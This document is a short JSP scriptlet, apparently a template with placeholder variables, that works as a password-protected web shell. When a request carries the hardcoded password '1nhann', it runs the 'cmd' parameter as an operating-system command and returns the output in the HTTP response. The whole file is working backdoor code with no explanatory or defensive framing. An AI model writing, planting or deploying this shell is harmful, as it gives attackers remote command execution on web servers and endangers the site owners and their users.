<%
    javax.servlet.http.HttpServletRequest request = $1;
    javax.servlet.http.HttpServletResponse response = $2;
    request.setCharacterEncoding("UTF-8");
    String password = request.getParameter("password");

    if (password != null) {
        if (password.equals("1nhann")) {
            String cmd = request.getParameter("cmd");
            Runtime rt = Runtime.getRuntime();
            Process process = rt.exec(cmd);
            java.io.InputStream in = process.getInputStream();
            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
            String s = null;
            StringBuilder sb = new StringBuilder();
            while ((s = stdInput.readLine()) != null) {
                sb.append(s);
                sb.append("\n");
            }
            response.getWriter().write(sb.toString());
            return;
        }
    }
%>
